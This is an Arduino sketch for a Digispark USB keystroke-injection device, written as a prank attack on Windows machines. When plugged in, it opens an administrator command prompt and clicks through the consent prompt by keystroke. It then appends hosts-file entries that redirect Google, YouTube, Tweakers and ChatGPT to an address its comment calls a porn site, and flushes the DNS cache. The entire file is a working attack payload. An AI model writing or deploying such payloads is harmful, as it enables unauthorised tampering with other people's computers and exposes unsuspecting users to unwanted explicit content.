#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
//Opens an administrator command prompt
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(250);
//Redirects popular sites to a porn site
  DigiKeyboard.println("ECHO 199.80.54.63 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 www.tweakers.nl >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 tweakers.nl >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 youtube.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 www.youtube.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 chatgpt.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 www.chatgpt.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");

  DigiKeyboard.println("ipconfig /flushdns");
  DigiKeyboard.println("exit");
  for(;;){  }
}